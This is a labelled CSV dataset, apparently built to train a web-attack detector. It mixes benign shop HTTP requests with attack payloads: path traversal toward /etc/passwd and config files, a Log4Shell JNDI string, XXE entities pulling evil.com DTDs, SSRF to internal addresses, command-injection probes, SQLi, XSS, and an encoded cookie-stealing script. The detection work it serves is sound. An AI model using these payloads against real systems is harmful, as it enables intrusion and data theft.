payload,label,source
.newInstance(([bytes]).toArray()) }},ssti,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39&cantidad=62&B1=A%F1adir+al+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F630CDAC162F829D02EBF22D51E0E193 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=59D8BE4FA743B5CD458611384D5FAC7E Connection: close",normal,csic_2010
${j${lower:N}di:corba://callback.net:443/shell},log4shell,augmented
modo=entrar&login=gowl&pwd=mentirilLa&remember=off%2F&B1=Entrar,sqli,csic_2010
"<!DOCTYPE foo [<!data672 data672 PUBLIC ""-//ATT//DTD//EN"" ""http://evil.com/evil.dtd"">]><foo>&data672;</foo>",xxe,augmented
"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6AED64512EC326F8BAAE18D8A336672E Connection: close",normal,csic_2010
OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'),sqli,seclists
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=muir&pwd=trufa4dor&remember=on&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=65B48E2798F28214416B831F739EDC88 Connection: close",normal,csic_2010
../../../../../../opt/apache2/conf/httpd.conf%00,path_traversal,seclists
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=144463BCE0EFDC59F48D7B704A95C361 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
??%252f??%252fetc%252fissue,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=546750D1C36D347DCE938240842B5B9A Connection: close",normal,csic_2010
../../../../../var/log/mysql/mysql.log,path_traversal,seclists
C:\Users\All Users\AppData\Local\Temp\dd_setup_20200921070620_222_typescript.languageservice.log,path_traversal,seclists
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=AA9A1DE6E94D389BCAA7A8D8A3EB63CF Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
%c0%fe%c0%fe%f8%80%80%80%af%c0%fe%c0%fe%f8%80%80%80%af%c0%fe%c0%fe%f8%80%80%80%af%c0%fe%c0%fe%f8%80%80%80%af%c0%fe%c0%fe%f8%80%80%80%af%c0%fe%c0%fe%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,path_traversal,payloads_all_the_things
'&echo$IFSKFDAKU$((72%2B93))$(echo$IFSKFDAKU)KFDAKU%7C,command_injection,seclists
modo=insertar&precio=7177&B1=Confirmar,normal,csic_2010
"Exploit Description: Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where <META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).",xss,seclists
"<?xml version=""1.0""?><!DOCTYPE root [<!read916 read916 SYSTEM ""/etc/crontab"">]><root>&read916;</root>",xxe,augmented
..../%c1%1c..../%c1%1c..../%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F89D8705DE6ECD2CAE4CE91BF4EF7171 Connection: close",normal,csic_2010
..%c1%9c..%c1%9c..%c1%9cboot.ini,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=A6947C3B2E1B25BC4DAF53ECCCE43B37 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6840CA1A9842531E00AD88B3692DEFEF Connection: close",normal,csic_2010
?.%c1%1c?.%c1%1c?.%c1%1c?.%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts,path_traversal,payloads_all_the_things
..../%c1%1cetc%c1%1cissue,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C390FAD266CB3FA0C0C480B6C11813B4 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=D3F62D15144AB1AC0DBC62A208991871 Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=82CD6B6C71250B7D2CB90E303426DE37 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C7178921CF1855C9CA497CEF698E481B Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
host=jar://::ffff:127.0.0.1:443/proc/self/environ,ssrf,augmented
%c0%5e%c0%5e%c0%9v%c0%5e%c0%5e%c0%9v%c0%5e%c0%5e%c0%9v%c0%5e%c0%5e%c0%9v%c0%5e%c0%5e%c0%9v%c0%5e%c0%5e%c0%9vetc%c0%9vpasswd,path_traversal,payloads_all_the_things
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=7A167BA9026EA5D9F5FDEED479D9F7B7 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=DBFC0F7F4AE100ABBCED785481CEE090 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
{{tmp+34}},ssti,augmented
"GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9046934D639A41BE91C182BED3E3C81A Connection: close",normal,csic_2010
%uff0e%uff0e%bg%qf%uff0e%uff0e%bg%qfetc%bg%qfpasswd,path_traversal,payloads_all_the_things
GET /?src=gopher://2130706433:9999/health HTTP/1.1,ssrf,augmented
https://localhost/admin,ssrf,augmented
"GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=CA61493082139A27D328AC6626CABFFF Connection: close",normal,csic_2010
..../%5c..../%5c..../%5c..../%5c..../%5c..../%5cetc%5cpasswd,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0DE5E800F1E389E181D73E732C41BB93 Connection: close",normal,csic_2010
%22%0A%20str%3D%24%28echo%20DAECDG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,command_injection,seclists
../../../../../../../../../../../www/logs/proftpd.system.log,path_traversal,seclists
../../../../../../../../../../../../../../../usr/local/pureftpd/etc/pure-ftpd.conf,path_traversal,seclists
%c0%5e%c0%5e%c1%pcetc%c1%pcpasswd,path_traversal,payloads_all_the_things
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0F33ACB9E67E13B36677052C909B36BE Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=76F77B965B498A6EB848A9A4A8071785 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
modo=registro&login=asawa&password=S4DsUDEStE&nombre=Rhett&apellidos=Venzal+Tamayo&email=whitehead.kogan%40lamarsrl.qa&dni=98585223R&direccion=C%2F+Naturopata+Diego+Prieto+58%2C+&ciudad=Piedramillera&cp=33120&provincia=Pontevedra&ntc=7058252446193830&B1=Registrar,normal,csic_2010
modo=entrar&login=beilul&pwd=trashumaci%F3n&remember=off&B1=Entrar,normal,csic_2010
"GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=799359BA8044ED729324CE80C311D75F Connection: close",normal,csic_2010
redirect=dict://127.1/admin,ssrf,augmented
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kuofeng&pwd=enmendable&remember=on&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=93C447E7610A666C3ABFD0904484A7C7 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=A141C40ABA2EBE6B0CB1D8A7AA52F5CA Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"<?xml version=""1.0""?><!DOCTYPE root [<!test279 % remote SYSTEM ""http://evil.com/evil.dtd"">%remote;]><root/>",xxe,augmented
%22|echo%20WXWDDM$((64%2B94))$(echo%20WXWDDM)WXWDDM,command_injection,seclists
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE},path_traversal,payloads_all_the_things
../../../../../../../../../../../../../../../proc/self/fd/22,path_traversal,seclists
modo=registro&login=jarn%2Cak&password=DEsFaVoREcEr&nombre=Humildad&apellidos=Sanagua+Manzano&email=polakov_gaar%40rocofer.kh&dni=08092387K&direccion=Plaza+Del+Ensanche+33+12-A&ciudad=Lantadilla&cp=47494&provincia=Barcelona&ntc=7269685005406130&B1=Registrar,sqli,csic_2010
modo=entrar&login=shoshann&pwd=3u6o73s0&remember=off&B1=Entrar,normal,csic_2010
"GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=BC69A02D4038A9EB2A7A32187BD1CA23 Connection: close",normal,csic_2010
image_url=https://172.16.0.1:80/,ssrf,augmented
modo=insertar&precio=1124&B1=Confirmar%2F,sqli,csic_2010
"<dialog onpaste=""alert(1)"" contenteditable>test</dialog>",xss,seclists
modo=registro&login=maribeth4&password=monEder-%EDa&nombre=Fabiola&apellidos=Aliseda+Fullat&email=ljund%40casadedurcal.sl&dni=84413002N&direccion=Calle+Correa+De+Arauxo+176+&ciudad=Alfafara&cp=08300&provincia=Toledo&ntc=0131573485313160&B1=Registrar,normal,csic_2010
../../../../../../../../../../../apache2/logs/error.log,path_traversal,seclists
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6E8B6E86B3D4D232E9302915E722E869 Connection: close",normal,csic_2010
%%32%%65%%32%%65%uEFC8%%32%%65%%32%%65%uEFC8%%32%%65%%32%%65%uEFC8%%32%%65%%32%%65%uEFC8etc%uEFC8issue,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=33&B1=A%F1adir+al+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=AAE3113D8875AD935BA4EFD8114FB456 Connection: close",normal,csic_2010
